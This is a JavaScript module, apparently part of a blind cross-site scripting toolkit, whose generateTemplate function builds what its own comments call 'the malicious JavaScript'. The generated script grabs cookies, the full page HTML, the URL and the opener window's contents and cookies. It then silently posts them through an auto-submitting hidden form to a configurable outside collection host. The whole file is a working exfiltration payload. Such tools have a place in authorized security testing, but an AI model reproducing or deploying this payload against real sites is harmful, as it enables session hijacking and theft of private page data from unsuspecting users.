// As some companies might not want all of their innerHTML to be leaked to a third-party
// This function acts as a barrier, by default this is set to 0, which means its non-intrusive
// We will only capture relevant information about the host, and report it
function determineInstrusive(config) {
  const capture = {};
  capture.cookie = config.intrusiveLevel === 1 ? 'document.cookie' : 'null';
  capture.documentBody = config.intrusiveLevel === 1 ? 'document.body.parentNode.innerHTML' : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))';
  capture.url = config.intrusiveLevel === 1 ? 'document.URL' : 'document.URL';
  capture.location = config.intrusiveLevel === 1 ? 'opener.location' : 'opener.location';
  capture.openerBody = config.intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null';
  capture.openerCookie = config.intrusiveLevel === 1 ? 'opener.document.cookie' : 'null';
  return capture;
}

// Identifying the DOM of the page which was injected at non-intrusive level
// First identify the correct script, where bXSS occured
// Traverse the DOM until we hit the HTML (root element)
function captureParentNodes(config) {
  return `
      function captureParentNodes(element, _array) {
            console.log(element.nodeName)
            if (_array === undefined) {
                  _array = [];
                  _array.push(element.nodeName)
            }
            else {
                  console.log(element.nodeName)
                   _array.push(element.nodeName);
            }
            // do recursion until HTML is reached
            if(element.nodeName !== 'HTML' ) return captureParentNodes(element.parentNode, _array);
            else return _array;           
      }

      function identifyTagAndCaptureParentNodes(tagName) {
            var scriptLocation = ''
            for(i = 0;i < tagName.length; i++)
            {
            if(tagName[i].src.indexOf('${config.url}/m')) {
                  scriptLocation = tagName[i]; 
            }
            }
            return captureParentNodes(scriptLocation)
      }
      `;
}

// What is served over //${config.url}/m
// generateTemplate builds the malicious JavaScript
exports.generateTemplate = (config) => {
  const capture = determineInstrusive(config);
  const template = `(function(){
        if(window.name!=='__'){

            ${captureParentNodes(config)}

                  try {dcoo = ${capture.cookie}} catch(e) {dcoo=null}
                  try {inne = ${capture.documentBody}} catch(e) {inne=null}
                  try {durl = ${capture.url}} catch(e) {durl=null}
                  try {oloc = ${capture.location}} catch(e) {oloc=null}
                  try {oloh = ${capture.openerBody}} catch(e) {oloh=null}
                  try {odoc = ${capture.openerCookie}} catch(e) {odoc=null}
      
                  var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
            var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
                  var body = document.getElementsByTagName('body')[0];
      
            __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc));
            __.setAttribute('name','_');
            _.appendChild(__);
            _.action='//${config.url}/m';
            _.method='post';
                  //_.target='_blank';
      
            body.appendChild(_);
            window.name='__';
            _.submit();
            //history.back();
        } else {window.name=''}
      })();`;

  return template;
};
